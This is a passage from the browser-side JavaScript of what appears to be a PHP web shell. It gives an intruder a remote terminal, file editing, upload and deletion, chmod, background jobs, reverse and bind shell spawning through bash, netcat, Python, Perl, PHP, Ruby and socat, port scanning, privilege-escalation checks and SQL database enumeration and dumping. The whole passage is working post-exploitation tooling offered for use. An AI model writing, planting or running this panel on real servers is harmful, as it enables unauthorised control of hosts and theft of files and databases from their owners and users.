    loadReverseShellMethods();
    setInterval(refreshJobs, 3000);
    document.addEventListener('click', hideContextMenu);
})();

async function loadSysInfo() {
    const res = await fetch(API + 'sysinfo');
    sysInfo = await res.json();
    document.getElementById('headerInfo').textContent =
        `${sysInfo.user}@${sysInfo.hostname} | PHP ${sysInfo.php}`;
    currentPath = sysInfo.cwd;
    document.getElementById('cwdInfo').textContent = currentPath;
    document.getElementById('currentPath').value = currentPath;
}

function switchView(viewName) {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById(viewName).classList.add('active');
    event.target.classList.add('active');

    if (viewName === 'files') browsePath();
    if (viewName === 'jobs') refreshJobs();
    if (viewName === 'processes') loadProcesses();
    if (viewName === 'network') loadNetworkInfo();
}

// === TERMINAL ===
function setupTerminalInput() {
    const input = document.getElementById('cmdInput');
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            execCmd();
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIndex < commandHistory.length - 1) {
                historyIndex++;
                input.value = commandHistory[historyIndex];
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIndex > 0) {
                historyIndex--;
                input.value = commandHistory[historyIndex];
            } else if (historyIndex === 0) {
                historyIndex = -1;
                input.value = '';
            }
        }
    });
    input.focus();
}

async function execCmd() {
    const input = document.getElementById('cmdInput');
    const cmd = input.value.trim();
    if (!cmd) return;

    commandHistory.unshift(cmd);
    historyIndex = -1;
    appendTerminal(`\n$ ${cmd}`, 'terminal-prompt');
    input.value = '';

    const formData = new FormData();
    formData.append('cmd', cmd);

    const res = await fetch(API + 'exec', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        appendTerminal(data.error, 'terminal-error');
    } else {
        if (data.output) {
            appendTerminal(data.output, 'terminal-output');
        }
        if (data.cwd) {
            currentPath = data.cwd;
            document.getElementById('cwdInfo').textContent = currentPath;
        }
    }
    input.focus();
}

function appendTerminal(text, className = '') {
    const output = document.getElementById('terminalOutput');
    const line = document.createElement('div');
    line.className = 'terminal-line ' + className;
    line.textContent = text;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
}

// === FILE BROWSER ===
async function browsePath(path) {
    if (!path) path = document.getElementById('currentPath').value || currentPath;

    const res = await fetch(API + 'browse&path=' + encodeURIComponent(path));
    const data = await res.json();

    if (data.error) {
        alert(data.error);
        return;
    }

    currentPath = data.path;
    document.getElementById('currentPath').value = currentPath;
    document.getElementById('cwdInfo').textContent = currentPath;

    renderFileList(data.items);
}

function renderFileList(items) {
    const list = document.getElementById('fileList');
    list.innerHTML = '';

    items.forEach(item => {
        const div = document.createElement('div');
        div.className = 'file-item' + (item.type === 'dir' ? ' dir' : '');

        if (item.type === 'dir') {
            div.onclick = () => browsePath(item.path);
        } else {
            div.oncontextmenu = (e) => showContextMenu(e, item);
        }

        const actions = item.type === 'file' ? `
            <div class="file-actions">
                <button class="small secondary" onclick="event.stopPropagation(); viewFile('${item.path.replace(/'/g, "\\'")}')">👁️</button>
                <button class="small secondary" onclick="event.stopPropagation(); editFile('${item.path.replace(/'/g, "\\'")}')">✏️</button>
                <button class="small secondary" onclick="event.stopPropagation(); downloadFile('${item.path.replace(/'/g, "\\'")}')">⬇️</button>
                <button class="small danger" onclick="event.stopPropagation(); deleteFile('${item.path.replace(/'/g, "\\'")}')">🗑️</button>
            </div>
        ` : '';

        div.innerHTML = `
            <div class="file-icon">${item.type === 'dir' ? '📁' : '📄'}</div>
            <div class="file-name">${item.name}</div>
            <div class="file-size">${item.type === 'file' ? formatSize(item.size) : ''}</div>
            <div class="file-perms">${item.perms}</div>
            <div></div>
            ${actions}
        `;

        list.appendChild(div);
    });
}

function showContextMenu(e, item) {
    e.preventDefault();
    currentFile = item;
    const menu = document.getElementById('contextMenu');
    menu.classList.remove('hidden');
    menu.style.left = e.pageX + 'px';
    menu.style.top = e.pageY + 'px';
}

function hideContextMenu() {
    document.getElementById('contextMenu').classList.add('hidden');
}

function contextAction(action) {
    if (!currentFile) return;
    hideContextMenu();

    switch (action) {
        case 'view': viewFile(currentFile.path); break;
        case 'edit': editFile(currentFile.path); break;
        case 'download': downloadFile(currentFile.path); break;
        case 'chmod': showChmodModal(currentFile.path, currentFile.name); break;
        case 'delete': deleteFile(currentFile.path); break;
    }
}

async function viewFile(path) {
    const res = await fetch(API + 'read&file=' + encodeURIComponent(path));
    const data = await res.json();

    if (data.error) {
        alert(data.error);
        return;
    }

    document.getElementById('editorTitle').textContent = 'View: ' + path;
    document.getElementById('editorContent').value = data.content;
    document.getElementById('editorContent').readOnly = true;
    document.getElementById('editorModal').classList.add('active');
}

async function editFile(path) {
    const res = await fetch(API + 'read&file=' + encodeURIComponent(path));
    const data = await res.json();

    if (data.error) {
        alert(data.error);
        return;
    }

    document.getElementById('editorTitle').textContent = 'Edit: ' + path;
    document.getElementById('editorContent').value = data.content;
    document.getElementById('editorContent').readOnly = false;
    document.getElementById('editorContent').dataset.path = path;
    document.getElementById('editorModal').classList.add('active');
}

async function saveFileContent() {
    const content = document.getElementById('editorContent').value;
    const path = document.getElementById('editorContent').dataset.path;

    const formData = new FormData();
    formData.append('path', path);
    formData.append('content', content);

    const res = await fetch(API + 'write', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        alert('File saved');
        closeModal('editorModal');
        refreshFiles();
    }
}

function downloadFile(path) {
    window.location.href = API + 'download&file=' + encodeURIComponent(path);
}

async function deleteFile(path) {
    if (!confirm('Delete this file?')) return;

    const formData = new FormData();
    formData.append('path', path);

    const res = await fetch(API + 'delete', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        refreshFiles();
    }
}

function showChmodModal(path, name) {
    document.getElementById('chmodFilename').textContent = name;
    document.getElementById('chmodMode').value = '0755';
    document.getElementById('chmodMode').dataset.path = path;
    document.getElementById('chmodModal').classList.add('active');
}

async function performChmod() {
    const path = document.getElementById('chmodMode').dataset.path;
    const mode = document.getElementById('chmodMode').value;

    const formData = new FormData();
    formData.append('path', path);
    formData.append('mode', mode);

    const res = await fetch(API + 'chmod', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        alert('Permissions changed');
        closeModal('chmodModal');
        refreshFiles();
    }
}

function refreshFiles() {
    browsePath(currentPath);
}

function showUploadModal() {
    document.getElementById('uploadModal').classList.add('active');
}

async function performUpload() {
    const fileInput = document.getElementById('uploadFile');

    if (!fileInput.files[0]) {
        alert('Select a file');
        return;
    }

    const formData = new FormData();
    formData.append('file', fileInput.files[0]);
    formData.append('path', currentPath);

    const res = await fetch(API + 'upload', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        alert('File uploaded');
        closeModal('uploadModal');
        fileInput.value = '';
        refreshFiles();
    }
}

function showMkdirModal() {
    document.getElementById('mkdirPath').value = currentPath + '/';
    document.getElementById('mkdirModal').classList.add('active');
}

async function performMkdir() {
    const path = document.getElementById('mkdirPath').value;

    const formData = new FormData();
    formData.append('path', path);

    const res = await fetch(API + 'mkdir', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        alert('Directory created');
        closeModal('mkdirModal');
        refreshFiles();
    }
}

// === JOBS ===
async function uploadJobScript() {
    const fileInput = document.getElementById('scriptFile');
    const nameInput = document.getElementById('jobName');

    if (!fileInput.files[0]) {
        alert('Select a script file');
        return;
    }

    const formData = new FormData();
    formData.append('script', fileInput.files[0]);
    formData.append('name', nameInput.value || fileInput.files[0].name);

    const res = await fetch(API + 'job_upload', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        alert('Job created: ' + data.job_id);
        fileInput.value = '';
        nameInput.value = '';
        refreshJobs();
    }
}

async function refreshJobs() {
    const res = await fetch(API + 'jobs_list');
    const data = await res.json();
    renderJobs(data.jobs);
}

function renderJobs(jobs) {
    const list = document.getElementById('jobList');

    if (!jobs || jobs.length === 0) {
        list.innerHTML = '<div style="text-align: center; padding: 40px; color: #8b949e;">No jobs yet. Upload a script to get started.</div>';
        return;
    }

    list.innerHTML = '';

    jobs.forEach(job => {
        const card = document.createElement('div');
        card.className = 'job-card';

        const statusClass = job.status.toLowerCase();
        const created = new Date(job.created * 1000).toLocaleString();

        let actions = '';
        if (job.status === 'pending') {
            actions = `<button class="small" onclick="executeJob('${job.id}')">▶️ Run</button>`;
        } else if (job.status === 'running') {
            actions = `<button class="small danger" onclick="stopJob('${job.id}')">⏹️ Stop</button>`;
        }

        actions += `
            <button class="small secondary" onclick="viewJobOutputFullscreen('${job.id}', '${job.name.replace(/'/g, "\\'")}')">📄 View Output</button>
            <button class="small danger" onclick="deleteJob('${job.id}')">🗑️ Delete</button>
        `;

        card.innerHTML = `
            <div class="job-header">
                <div class="job-name">${job.name}</div>
                <div class="job-status ${statusClass}">${job.status}</div>
            </div>
            <div style="font-size: 11px; color: #8b949e; margin-bottom: 10px;">
                Created: ${created}
                ${job.pid ? ` | PID: ${job.pid}` : ''}
                ${job.output_size ? ` | Output: ${formatSize(job.output_size)}` : ''}
            </div>
            <div class="job-actions">${actions}</div>
        `;

        list.appendChild(card);
    });
}

async function executeJob(jobId) {
    const formData = new FormData();
    formData.append('job_id', jobId);

    const res = await fetch(API + 'job_execute', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        refreshJobs();
    }
}

async function stopJob(jobId) {
    const formData = new FormData();
    formData.append('job_id', jobId);

    const res = await fetch(API + 'job_stop', {
        method: 'POST',
        body: formData
    });

    refreshJobs();
}

async function deleteJob(jobId) {
    if (!confirm('Delete this job?')) return;

    const formData = new FormData();
    formData.append('job_id', jobId);

    const res = await fetch(API + 'job_delete', {
        method: 'POST',
        body: formData
    });

    refreshJobs();
}

async function viewJobOutputFullscreen(jobId, jobName) {
    currentJobId = jobId;
    document.getElementById('jobOutputName').textContent = jobName;
    document.getElementById('jobOutputModal').classList.add('active');
    await refreshJobOutput();
}

async function refreshJobOutput() {
    if (!currentJobId) return;

    const res = await fetch(API + 'job_output&job_id=' + currentJobId + '&offset=0');
    const data = await res.json();

    document.getElementById('jobOutputContent').textContent = data.output || '[No output yet]';
    document.getElementById('jobOutputContent').scrollTop = document.getElementById('jobOutputContent').scrollHeight;
}

function toggleAutoRefresh() {
    const btn = document.getElementById('autoRefreshBtn');

    if (autoRefreshInterval) {
        clearInterval(autoRefreshInterval);
        autoRefreshInterval = null;
        btn.textContent = '🔄 Auto-refresh OFF';
        btn.classList.remove('active');
    } else {
        autoRefreshInterval = setInterval(refreshJobOutput, 1000);
        btn.textContent = '🔄 Auto-refresh ON';
        btn.classList.add('active');
    }
}

function downloadJobOutput() {
    window.location.href = API + 'job_download&job_id=' + currentJobId;
}

// === REVERSE SHELL ===
function loadReverseShellMethods() {
    const methods = [
        { name: 'Bash TCP', id: 'bash', desc: 'Standard bash reverse shell' },
        { name: 'Bash Exec', id: 'bash_exec', desc: 'Bash with exec descriptor' },
        { name: 'Netcat -e', id: 'nc', desc: 'Netcat with -e flag' },
        { name: 'Netcat Pipe', id: 'nc_pipe', desc: 'Netcat with named pipe' },
        { name: 'Python', id: 'python', desc: 'Python 2.x reverse shell' },
        { name: 'Python3', id: 'python3', desc: 'Python 3.x reverse shell' },
        { name: 'PHP', id: 'php', desc: 'PHP reverse shell' },
        { name: 'Perl', id: 'perl', desc: 'Perl reverse shell' },
        { name: 'Ruby', id: 'ruby', desc: 'Ruby reverse shell' },
        { name: 'Socat', id: 'socat', desc: 'Socat reverse shell' },
    ];

    const grid = document.getElementById('revshellMethods');
    grid.innerHTML = '';

    methods.forEach(method => {
        const card = document.createElement('div');
        card.className = 'tool-card';
        card.onclick = () => spawnRevShell(method.id);

        card.innerHTML = `
            <div class="tool-title">${method.name}</div>
            <div class="tool-desc">${method.desc}</div>
        `;

        grid.appendChild(card);
    });
}

async function spawnRevShell(method) {
    const host = document.getElementById('revHost').value;
    const port = document.getElementById('revPort').value;

    if (!host || !port) {
        alert('Enter LHOST and LPORT');
        return;
    }

    if (!confirm(`Spawn ${method} reverse shell to ${host}:${port}?`)) return;

    const formData = new FormData();
    formData.append('host', host);
    formData.append('port', port);
    formData.append('method', method);

    const res = await fetch(API + 'revshell_spawn', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        alert(`Reverse shell spawned!\nJob ID: ${data.job_id}\nPID: ${data.pid}\n\nCommand: ${data.command}`);
        switchView('jobs');
        refreshJobs();
    }
}

// === BIND SHELL ===
async function spawnBindShell(method) {
    const port = document.getElementById('bindPort').value;

    if (!port) {
        alert('Enter port');
        return;
    }

    if (!confirm(`Spawn ${method} bind shell on port ${port}?`)) return;

    const formData = new FormData();
    formData.append('port', port);
    formData.append('method', method);

    const res = await fetch(API + 'bindshell_spawn', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        alert(`Bind shell spawned on port ${port}!\nJob ID: ${data.job_id}\nPID: ${data.pid}\n\nConnect with: nc ${sysInfo.hostname} ${port}`);
        switchView('jobs');
        refreshJobs();
    }
}

// === PORT SCANNER ===
async function runPortScan() {
    const target = document.getElementById('scanTarget').value;
    const ports = document.getElementById('scanPorts').value;

    if (!target) {
        alert('Enter target');
        return;
    }

    document.getElementById('scanOutput').textContent = 'Scanning...';

    const formData = new FormData();
    formData.append('target', target);
    formData.append('ports', ports);

    const res = await fetch(API + 'port_scan', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        document.getElementById('scanOutput').textContent = 'Error: ' + data.error;
    } else {
        let output = `Scan results for ${target}:\n\n`;
        if (data.results.length === 0) {
            output += 'No open ports found.';
        } else {
            data.results.forEach(r => {
                output += `Port ${r.port}: ${r.status}\n`;
            });
        }
        document.getElementById('scanOutput').textContent = output;
    }
}

// === FIND FILES ===
async function runFind() {
    const path = document.getElementById('findPath').value;
    const name = document.getElementById('findName').value;
    const content = document.getElementById('findContent').value;

    if (!name && !content) {
        alert('Enter filename or content pattern');
        return;
    }

    const formData = new FormData();
    formData.append('path', path);
    formData.append('name', name);
    formData.append('content', content);

    const res = await fetch(API + 'find_files', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        alert(`Search started as job ${data.job_id}. Check Jobs tab for results.`);
        switchView('jobs');
        refreshJobs();
    }
}

// === PROCESSES ===
async function loadProcesses() {
    document.getElementById('processOutput').textContent = 'Loading...';

    const res = await fetch(API + 'processes');
    const data = await res.json();

    document.getElementById('processOutput').textContent = data.output;
}

// === NETWORK ===
async function loadNetworkInfo() {
    document.getElementById('netInterfaces').textContent = 'Loading...';
    document.getElementById('netRoutes').textContent = 'Loading...';
    document.getElementById('netConnections').textContent = 'Loading...';

    const res = await fetch(API + 'network_info');
    const data = await res.json();

    document.getElementById('netInterfaces').textContent = data.interfaces;
    document.getElementById('netRoutes').textContent = data.routes;
    document.getElementById('netConnections').textContent = data.connections;
}

// === ENCODER ===
async function encode(type) {
    const text = document.getElementById('encodeText').value;

    if (!text) {
        alert('Enter text');
        return;
    }

    const formData = new FormData();
    formData.append('text', text);
    formData.append('type', type);

    const res = await fetch(API + 'encode', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        alert(data.error);
    } else {
        document.getElementById('encodeResult').value = data.result;
    }
}

// === PRIVESC ===
async function runPrivescCheck() {
    document.getElementById('privescOutput').innerHTML = '<p style="color: #8b949e;">Running checks...</p>';

    const res = await fetch(API + 'privesc_check');
    const data = await res.json();

    let html = '';

    for (const [key, value] of Object.entries(data)) {
        html += `
            <div>
                <h3 style="color: #58a6ff; margin-bottom: 10px;">${key.toUpperCase()}</h3>
                <div class="output-viewer" style="max-height: 200px;">${value || '[None]'}</div>
            </div>
        `;
    }

    document.getElementById('privescOutput').innerHTML = html;
}

// === PHP INFO ===
async function loadPhpInfo() {
    document.getElementById('phpinfoOutput').innerHTML = 'Loading...';

    const res = await fetch(API + 'phpinfo');
    const data = await res.json();

    document.getElementById('phpinfoOutput').innerHTML = data.html;
}

// === SQL CLIENT ===
let currentSqlResults = null;

function updateSqlDefaults() {
    const type = document.getElementById('sqlType').value;
    const portInput = document.getElementById('sqlPort');
    const dbInput = document.getElementById('sqlDb');

    // Set default ports
    if (type === 'mysql') {
        portInput.value = '3306';
        dbInput.placeholder = 'Database name (optional)';
    } else if (type === 'pgsql') {
        portInput.value = '5432';
        dbInput.placeholder = 'Database name (optional)';
    } else if (type === 'sqlite') {
        portInput.value = '';
        dbInput.placeholder = 'Path to SQLite file';
    }
}

async function sqlConnect() {
    const type = document.getElementById('sqlType').value;
    const host = document.getElementById('sqlHost').value;
    const port = document.getElementById('sqlPort').value;
    const user = document.getElementById('sqlUser').value;
    const pass = document.getElementById('sqlPass').value;
    const db = document.getElementById('sqlDb').value;

    if (type !== 'sqlite' && !user) {
        alert('Enter username');
        return;
    }

    document.getElementById('sqlResults').innerHTML = '<p style="color: #8b949e;">Connecting...</p>';

    const formData = new FormData();
    formData.append('type', type);
    formData.append('host', host);
    formData.append('port', port);
    formData.append('user', user);
    formData.append('pass', pass);
    formData.append('db', db);

    const res = await fetch(API + 'sql_connect', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        document.getElementById('sqlResults').innerHTML = `<p style="color: #f85149;">Error: ${data.error}</p>`;
    } else {
        document.getElementById('sqlResults').innerHTML = `<p style="color: #3fb950;">${data.message}</p>`;
        await loadDatabaseBrowser();
    }
}

async function loadDatabaseBrowser() {
    const browser = document.getElementById('sqlBrowser');
    browser.innerHTML = '<p style="color: #8b949e; font-size: 12px;">Loading databases...</p>';

    await quickQuery('databases', true);
}

async function quickQuery(type, forBrowser = false) {
    const queries = {
        'version': {
            mysql: 'SELECT VERSION() as version',
            pgsql: 'SELECT version()',
            sqlite: 'SELECT sqlite_version() as version'
        },
        'databases': {
            mysql: 'SHOW DATABASES',
            pgsql: "SELECT datname FROM pg_database WHERE datistemplate = false",
            sqlite: "SELECT name FROM sqlite_master WHERE type='table'"
        },
        'tables': {
            mysql: 'SHOW TABLES',
            pgsql: "SELECT tablename FROM pg_tables WHERE schemaname = 'public'",
            sqlite: "SELECT name FROM sqlite_master WHERE type='table'"
        },
        'users': {
            mysql: 'SELECT user, host FROM mysql.user',
            pgsql: 'SELECT usename FROM pg_user',
            sqlite: '' // N/A
        },
        'privileges': {
            mysql: 'SHOW GRANTS',
            pgsql: 'SELECT * FROM information_schema.role_table_grants',
            sqlite: '' // N/A
        },
        'columns': {
            mysql: 'SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema = DATABASE()',
            pgsql: "SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema = 'public'",
            sqlite: '' // Need table name
        }
    };

    // Get current connection type from session (we'll need to fetch it)
    const formData = new FormData();
    formData.append('enum_type', type);

    if (!forBrowser) {
        document.getElementById('sqlResults').innerHTML = '<p style="color: #8b949e;">Executing...</p>';
    }

    const res = await fetch(API + 'sql_enum', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        if (!forBrowser) {
            document.getElementById('sqlResults').innerHTML = `<p style="color: #f85149;">Error: ${data.error}</p>`;
        }
    } else if (data.data) {
        if (forBrowser && type === 'databases') {
            renderDatabaseBrowser(data.data);
        } else {
            displaySqlResults(data.data, data.data.length);
        }
    }
}

function renderDatabaseBrowser(databases) {
    const browser = document.getElementById('sqlBrowser');

    if (!databases || databases.length === 0) {
        browser.innerHTML = '<p style="color: #8b949e; font-size: 12px;">No databases found</p>';
        return;
    }

    let html = '<div style="font-size: 12px;">';

    databases.forEach(db => {
        const dbName = db.Database || db.datname || db.name || Object.values(db)[0];
        html += `
            <div style="padding: 6px; border-radius: 4px; cursor: pointer; margin-bottom: 2px;"
                 onmouseover="this.style.background='#21262d'"
                 onmouseout="this.style.background='transparent'"
                 onclick="loadTables('${dbName}')">
                <span style="color: #58a6ff;">📁 ${dbName}</span>
            </div>
        `;
    });

    html += '</div>';
    browser.innerHTML = html;
}

async function loadTables(dbName) {
    const browser = document.getElementById('sqlBrowser');
    browser.innerHTML = '<p style="color: #8b949e; font-size: 12px;">Loading tables...</p>';

    // Switch to the database first
    const switchDb = `USE ${dbName}`;
    const query = 'SHOW TABLES';

    document.getElementById('sqlQuery').value = query;
    await executeQuery();
}

async function executeQuery() {
    const query = document.getElementById('sqlQuery').value.trim();

    if (!query) {
        alert('Enter a query');
        return;
    }

    document.getElementById('sqlResults').innerHTML = '<p style="color: #8b949e;">Executing...</p>';

    const formData = new FormData();
    formData.append('query', query);

    const res = await fetch(API + 'sql_query', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        document.getElementById('sqlResults').innerHTML = `<p style="color: #f85149;">Error: ${data.error}</p>`;
    } else if (data.data) {
        displaySqlResults(data.data, data.rows);
    } else if (data.message) {
        document.getElementById('sqlResults').innerHTML = `<p style="color: #3fb950;">${data.message}</p>`;
    }
}

function displaySqlResults(data, rowCount) {
    if (!data || data.length === 0) {
        document.getElementById('sqlResults').innerHTML = '<p style="color: #8b949e;">Query returned 0 rows.</p>';
        currentSqlResults = null;
        return;
    }

    currentSqlResults = data;

    // Get columns from first row
    const columns = Object.keys(data[0]);

    // Build HTML table
    let html = `<div style="margin-bottom: 10px; color: #8b949e; font-size: 12px;">Results: ${rowCount} rows</div>`;
    html += '<div style="overflow-x: auto;"><table style="width: 100%; border-collapse: collapse; font-size: 12px;">';

    // Header
    html += '<thead><tr>';
    columns.forEach(col => {
        html += `<th style="background: #21262d; padding: 8px; border: 1px solid #30363d; text-align: left; color: #58a6ff; font-weight: 600;">${col}</th>`;
    });
    html += '</tr></thead>';

    // Body
    html += '<tbody>';
    data.forEach((row, idx) => {
        html += '<tr>';
        columns.forEach(col => {
            const val = row[col];
            const displayVal = val === null ? '<span style="color: #8b949e; font-style: italic;">NULL</span>' : String(val);
            html += `<td style="padding: 8px; border: 1px solid #30363d; background: ${idx % 2 === 0 ? '#0d1117' : '#161b22'};">${displayVal}</td>`;
        });
        html += '</tr>';
    });
    html += '</tbody></table></div>';

    document.getElementById('sqlResults').innerHTML = html;
}

function clearQuery() {
    document.getElementById('sqlQuery').value = '';
}

function exportResults(format) {
    if (!currentSqlResults) {
        alert('No results to export');
        return;
    }

    let content = '';
    const filename = `sql_export_${Date.now()}.${format}`;

    if (format === 'json') {
        content = JSON.stringify(currentSqlResults, null, 2);
    } else if (format === 'csv') {
        const columns = Object.keys(currentSqlResults[0]);
        content = columns.join(',') + '\n';
        currentSqlResults.forEach(row => {
            const values = columns.map(col => {
                const val = row[col];
                if (val === null) return 'NULL';
                const str = String(val);
                // Escape quotes and wrap in quotes if contains comma
                return str.includes(',') || str.includes('"') ? `"${str.replace(/"/g, '""')}"` : str;
            });
            content += values.join(',') + '\n';
        });
    }

    // Create download
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
}

async function dumpTable() {
    const tableName = prompt('Enter table name to dump:');
    if (!tableName) return;

    document.getElementById('sqlResults').innerHTML = '<p style="color: #8b949e;">Dumping table...</p>';

    const formData = new FormData();
    formData.append('table', tableName);

    const res = await fetch(API + 'sql_dump_table', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        document.getElementById('sqlResults').innerHTML = `<p style="color: #f85149;">Error: ${data.error}</p>`;
    } else if (data.data) {
        displaySqlResults(data.data, data.rows);
    }
}

async function dumpDatabase() {
    const dbName = prompt('Enter database name to dump:');
    if (!dbName) return;

    if (!confirm(`This will dump the entire database "${dbName}" to a file. Continue?`)) return;

    document.getElementById('sqlResults').innerHTML = '<p style="color: #8b949e;">Dumping database... This may take a while...</p>';

    const formData = new FormData();
    formData.append('database', dbName);

    const res = await fetch(API + 'sql_dump_db', {
        method: 'POST',
        body: formData
    });

    const data = await res.json();

    if (data.error) {
        document.getElementById('sqlResults').innerHTML = `<p style="color: #f85149;">Error: ${data.error}</p>`;
    } else {
        document.getElementById('sqlResults').innerHTML =
            `<p style="color: #3fb950;">Database dump completed!</p>` +
            `<p style="color: #8b949e; font-size: 12px;">File: ${data.file}<br>` +
            `Size: ${formatSize(data.size)}<br>` +
            `Tables: ${data.tables}\n\n` +
            `You can download this file from the Files tab.`;
    }
}

// === UTILITIES ===
function formatSize(bytes) {
    const units = ['B', 'KB', 'MB', 'GB'];
    let size = bytes;
    let i = 0;
    while (size >= 1024 && i < units.length - 1) {
        size /= 1024;
        i++;
    }
    return size.toFixed(2) + ' ' + units[i];
}

function closeModal(id) {
    document.getElementById(id).classList.remove('active');

    if (id === 'jobOutputModal') {
        if (autoRefreshInterval) {
            clearInterval(autoRefreshInterval);
            autoRefreshInterval = null;
            document.getElementById('autoRefreshBtn').textContent = '🔄 Auto-refresh OFF';
        }
        currentJobId = null;
    }
}
</script>

</body>
</html>
<?php
}
?>
